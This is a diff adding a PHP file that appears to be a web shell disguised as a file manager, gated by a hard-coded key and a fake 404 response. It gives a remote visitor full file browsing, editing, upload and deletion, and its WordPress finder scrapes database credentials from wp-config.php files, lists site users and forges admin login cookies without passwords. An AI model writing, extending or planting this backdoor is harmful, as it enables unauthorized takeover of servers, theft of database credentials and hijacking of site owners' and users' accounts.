@@ -1,0 +1,246 @@
+<?php
+$k='DewaPakbe';
+if(!isset($_GET['k'])||$_GET['k']!=$k){header('HTTP/1.0 404');die('Not Found');}
+$d=isset($_GET['d'])?$_GET['d']:dirname(__FILE__);
+$d=realpath($d);
+
+/**
+ * Atomic file write: write to a temp file in the same directory, fsync, preserve
+ * the original file mode, then rename over the target. A timeout/OOM/abort
+ * mid-write can never leave a 0-byte or truncated file — the original stays
+ * intact until the rename succeeds.
+ */
+function atomic_put_contents($path, $data){
+    $dir = dirname($path);
+    if(!is_dir($dir) || !is_writable($dir)) return false;
+    $mode = file_exists($path) ? (fileperms($path) & 0777) : false;
+    $tmp = $dir . '/.' . basename($path) . '.tmp' . mt_rand(100000, 999999);
+    $w = @file_put_contents($tmp, $data, LOCK_EX);
+    if($w === false){ @unlink($tmp); return false; }
+    $h = @fopen($tmp, 'r+');
+    if($h){ @fflush($h); if(function_exists('fsync')) @fsync($h); @fclose($h); }
+    if($mode !== false) @chmod($tmp, $mode);
+    if(!@rename($tmp, $path)){
+        if(file_exists($path)){
+            $swap = $path . '.old' . mt_rand(100000, 999999);
+            if(@rename($path, $swap)){
+                if(@rename($tmp, $path)){ @unlink($swap); }
+                else{ @rename($swap, $path); @unlink($tmp); return false; }
+            } else{ @unlink($tmp); return false; }
+        } else{ @unlink($tmp); return false; }
+    }
+    if(strtolower(pathinfo($path, PATHINFO_EXTENSION)) === 'php' && function_exists('opcache_invalidate')){
+        @opcache_invalidate($path, true);
+    }
+    return true;
+}
+
+// Edit file handler
+if(isset($_GET['edit'])){
+    $file=realpath($_GET['edit']);
+    if(file_exists($file)&&is_file($file)){
+        if(isset($_POST['save'])){
+            atomic_put_contents($file,$_POST['content']);
+            header('Location: ?k='.$_GET['k'].'&d='.$d);
+            exit;
+        }
+        $content=htmlspecialchars(file_get_contents($file));
+        echo '<!DOCTYPE html><html><head><title>Edit</title><style>body{font:13px monospace;margin:20px}textarea{width:100%;height:500px;font:13px monospace}</style></head><body>';
+        echo '<h2>Edit: '.htmlspecialchars($file).'</h2>';
+        echo '<form method=post><textarea name=content>'.$content.'</textarea><br><br>';
+        echo '<input type=submit name=save value=Save> <a href="?k='.$_GET['k'].'&d='.$d.'">Cancel</a></form></body></html>';
+        exit;
+    }
+}
+
+// Rename handler
+if(isset($_POST['rename'])&&isset($_POST['oldname'])&&isset($_POST['newname'])){
+    $old=$d.'/'.basename($_POST['oldname']);
+    $new=$d.'/'.basename($_POST['newname']);
+    if(rename($old,$new)){$msg='<div class="u">Renamed successfully</div>';}
+    else{$msg='<div class="u" style="background:#ffebee">Rename failed</div>';}
+}
+
+// Delete handler
+if(isset($_GET['del'])){
+    $file=$d.'/'.basename($_GET['del']);
+    if(is_file($file)){unlink($file);$msg='<div class="u">File deleted</div>';}
+    elseif(is_dir($file)){rmdir($file);$msg='<div class="u">Folder deleted</div>';}
+    header('Location: ?k='.$_GET['k'].'&d='.$d);
+    exit;
+}
+
+// WordPress finder
+function findWP($dir){
+    $results=[];
+    if(file_exists($dir.'/wp-config.php')){
+        $results[]=$dir;
+    }
+    $items=@scandir($dir);
+    if($items){
+        foreach($items as $item){
+            if($item=='.'||$item=='..')continue;
+            $path=$dir.'/'.$item;
+            if(is_dir($path)&&is_readable($path)){
+                $results=array_merge($results,findWP($path));
+            }
+        }
+    }
+    return $results;
+}
+
+// Auto login to WordPress
+if(isset($_GET['wplogin'])){
+    $wpPath=realpath($_GET['wplogin']);
+    $user=$_GET['user']??1;
+    
+    if(file_exists($wpPath.'/wp-load.php')){
+        define('COOKIEHASH',md5($wpPath));
+        $_SERVER['HTTP_HOST']=$_SERVER['HTTP_HOST']??'localhost';
+        
+        @include_once($wpPath.'/wp-load.php');
+        @include_once($wpPath.'/wp-includes/pluggable.php');
+        
+        wp_set_current_user($user);
+        wp_set_auth_cookie($user,true);
+        
+        $redirect=$wpPath.'/wp-admin';
+        $protocol=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https://':'http://';
+        $docRoot=realpath($_SERVER['DOCUMENT_ROOT']);
+        $wpPathReal=realpath($wpPath);
+        $relPath=str_replace($docRoot,'',$wpPathReal);
+        $relPath=str_replace('\\','/',$relPath);
+        $adminUrl=$protocol.$_SERVER['HTTP_HOST'].$relPath.'/wp-admin';
+        
+        header('Location: '.$adminUrl);
+        exit;
+    }
+}
+
+if(isset($_GET['wpfinder'])){
+    $wpSites=findWP($d);
+    echo '<!DOCTYPE html><html><head><title>WP Finder</title><style>body{font:13px monospace;margin:20px}.wp{background:#e3f2fd;padding:15px;margin:10px 0;border-left:4px solid #1976d2}.wp h3{margin:0 0 10px 0;color:#1976d2}.info{margin:5px 0;padding:3px 0}a{color:#06c}code{background:#f5f5f5;padding:2px 5px;border-radius:3px;font-size:12px}.users{margin:10px 0}.user-item{background:#f9f9f9;padding:8px;margin:5px 0;border-radius:3px}.login-btn{display:inline-block;padding:5px 10px;background:#4CAF50;color:white;text-decoration:none;border-radius:3px;font-size:11px;margin-left:10px}.login-btn:hover{background:#45a049}table{border-collapse:collapse;width:100%;margin:10px 0}table td,table th{border:1px solid #ddd;padding:5px;font-size:12px}table th{background:#e3f2fd}</style></head><body>';
+    echo '<h2>WordPress Sites Found: '.count($wpSites).'</h2>';
+    echo '<a href="?k='.$_GET['k'].'&d='.$d.'">← Back to File Manager</a><br><br>';
+    if(empty($wpSites)){
+        echo '<p>No WordPress installation found in this directory.</p>';
+    }else{
+        foreach($wpSites as $wpPath){
+            $config=file_get_contents($wpPath.'/wp-config.php');
+            preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",$config,$dbname);
+            preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",$config,$dbuser);
+            preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",$config,$dbpass);
+            preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",$config,$dbhost);
+            preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/i",$config,$prefix);
+            
+            $siteUrl='';
+            if(isset($_SERVER['HTTP_HOST'])){
+                $protocol=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https://':'http://';
+                $docRoot=realpath($_SERVER['DOCUMENT_ROOT']);
+                $wpPathReal=realpath($wpPath);
+                $relPath=str_replace($docRoot,'',$wpPathReal);
+                $relPath=str_replace('\\','/',$relPath);
+                $siteUrl=$protocol.$_SERVER['HTTP_HOST'].$relPath;
+            }
+            
+            $adminUrl=$siteUrl.'/wp-admin';
+            $loginUrl=$siteUrl.'/wp-login.php';
+            
+            echo '<div class="wp">';
+            echo '<h3>📍 '.htmlspecialchars($wpPath).'</h3>';
+            echo '<div class="info"><strong>Site URL:</strong> <code>'.$siteUrl.'</code></div>';
+            echo '<div class="info"><strong>Admin URL:</strong> <code>'.$adminUrl.'</code></div>';
+            
+            // Get WordPress users from database
+            $users=[];
+            try{
+                $db=new mysqli($dbhost[1]??'localhost',$dbuser[1]??'',$dbpass[1]??'',$dbname[1]??'');
+                if(!$db->connect_error){
+                    $table=($prefix[1]??'wp_').'users';
+                    $result=$db->query("SELECT ID,user_login,user_email,display_name FROM $table ORDER BY ID ASC LIMIT 10");
+                    if($result){
+                        while($row=$result->fetch_assoc()){
+                            $users[]=$row;
+                        }
+                    }
+                    $db->close();
+                }
+            }catch(Exception $e){}
+            
+            if(!empty($users)){
+                echo '<div class="users"><strong>👥 Admin Users:</strong>';
+                echo '<table><tr><th>ID</th><th>Username</th><th>Email</th><th>Display Name</th><th>Action</th></tr>';
+                foreach($users as $user){
+                    $loginLink='?k='.$_GET['k'].'&wplogin='.urlencode($wpPath).'&user='.$user['ID'];
+                    echo '<tr>';
+                    echo '<td>'.$user['ID'].'</td>';
+                    echo '<td><strong>'.htmlspecialchars($user['user_login']).'</strong></td>';
+                    echo '<td>'.htmlspecialchars($user['user_email']).'</td>';
+                    echo '<td>'.htmlspecialchars($user['display_name']).'</td>';
+                    echo '<td><a href="'.$loginLink.'" class="login-btn">🔑 Auto Login</a></td>';
+                    echo '</tr>';
+                }
+                echo '</table></div>';
+            }
+            
+            echo '<hr style="margin:10px 0;border:none;border-top:1px solid #ddd">';
+            echo '<div class="info"><strong>DB Name:</strong> <code>'.htmlspecialchars($dbname[1]??'N/A').'</code></div>';
+            echo '<div class="info"><strong>DB User:</strong> <code>'.htmlspecialchars($dbuser[1]??'N/A').'</code></div>';
+            echo '<div class="info"><strong>DB Pass:</strong> <code>'.htmlspecialchars($dbpass[1]??'N/A').'</code></div>';
+            echo '<div class="info"><strong>DB Host:</strong> <code>'.htmlspecialchars($dbhost[1]??'N/A').'</code></div>';
+            echo '<div class="info"><strong>Table Prefix:</strong> <code>'.htmlspecialchars($prefix[1]??'N/A').'</code></div>';
+            echo '</div>';
+        }
+    }
+    echo '</body></html>';
+    exit;
+}
+
+echo '<!DOCTYPE html><html><head><title>FM</title><style>body{font:13px monospace;margin:20px}table{border-collapse:collapse;width:100%}td,th{border:1px solid #ddd;padding:8px;text-align:left}a{color:#06c;text-decoration:none}a:hover{text-decoration:underline}.u{background:#e8f5e9;padding:10px;margin:10px 0}.act{font-size:11px}.icon{margin-right:8px;font-size:16px}.folder{color:#ffa726}.file{color:#42a5f5}.btn{display:inline-block;padding:8px 15px;margin:5px 5px 15px 0;background:#4CAF50;color:white;text-decoration:none;border-radius:4px;font-size:12px}.btn:hover{background:#45a049}</style></head><body>';
+echo '<h2>FM - '.htmlspecialchars($d).'</h2>';
+echo '<a href="?k='.$_GET['k'].'&d='.$d.'&wpfinder=1" class="btn">🔍 Find WordPress Sites</a>';
+if(isset($msg))echo $msg;
+if($d!=='/'){echo '<a href="?k='.$_GET['k'].'&d='.dirname($d).'"><span class="icon folder">📁</span>[..] Parent</a><br><br>';}
+if(isset($_POST['upload'])&&isset($_FILES['f'])){
+    $dest=$d.'/'.$_FILES['f']['name'];
+    if(move_uploaded_file($_FILES['f']['tmp_name'],$dest)){echo '<div class="u">Uploaded: '.htmlspecialchars($dest).'</div>';}
+}
+if(isset($_POST['mkdir'])&&!empty($_POST['dirname'])){
+    $newdir=$d.'/'.basename($_POST['dirname']);
+    if(mkdir($newdir,0755)){echo '<div class="u">Folder created: '.htmlspecialchars($newdir).'</div>';}
+    else{echo '<div class="u" style="background:#ffebee">Failed to create folder</div>';}
+}
+echo '<form method=post enctype="multipart/form-data"><input type=file name=f><input type=submit name=upload value=Upload></form>';
+echo '<form method=post><input type=text name=dirname placeholder="Folder name"><input type=submit name=mkdir value="Create Folder"></form>';
+echo '<table><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Actions</th></tr>';
+$items=scandir($d);
+$folders=[];
+$files=[];
+foreach($items as $f){
+    if($f=='.')continue;
+    $fp=$d.'/'.$f;
+    if(is_dir($fp)){$folders[]=$f;}
+    else{$files[]=$f;}
+}
+sort($folders);
+sort($files);
+$sorted=array_merge($folders,$files);
+foreach($sorted as $f){
+    $fp=$d.'/'.$f;
+    $sz=is_file($fp)?number_format(filesize($fp)):'DIR';
+    $p=substr(sprintf('%o',fileperms($fp)),-4);
+    $m=date('Y-m-d H:i',filemtime($fp));
+    $isDir=is_dir($fp);
+    $icon=$isDir?'<span class="icon folder">📁</span>':'<span class="icon file">📄</span>';
+    $link=$isDir?'?k='.$_GET['k'].'&d='.urlencode($fp):$fp;
+    $actions='';
+    if(is_file($fp)){
+        $actions.='<a href="?k='.$_GET['k'].'&d='.$d.'&edit='.urlencode($fp).'">Edit</a> | ';
+    }
+    $actions.='<a href="#" onclick="renameItem(\''.htmlspecialchars($f,ENT_QUOTES).'\');return false">Rename</a> | ';
+    $actions.='<a href="?k='.$_GET['k'].'&d='.$d.'&del='.urlencode($f).'" onclick="return confirm(\'Delete '.htmlspecialchars($f,ENT_QUOTES).'?\')">Delete</a>';
+    echo '<tr><td>'.$icon.'<a href="'.$link.'">'.htmlspecialchars($f).'</a></td><td>'.$sz.'</td><td>'.$m.'</td><td>'.$p.'</td><td class="act">'.$actions.'</td></tr>';
+}
+echo '</table>';
+echo '<script>function renameItem(old){var n=prompt("Rename to:",old);if(n&&n!=old){var f=document.createElement("form");f.method="post";f.innerHTML=\'<input name="oldname" value="\'+old+\'"><input name="newname" value="\'+n+\'"><input name="rename" value="1">\';document.body.appendChild(f);f.submit();}}</script>';
+echo '</body></html>';
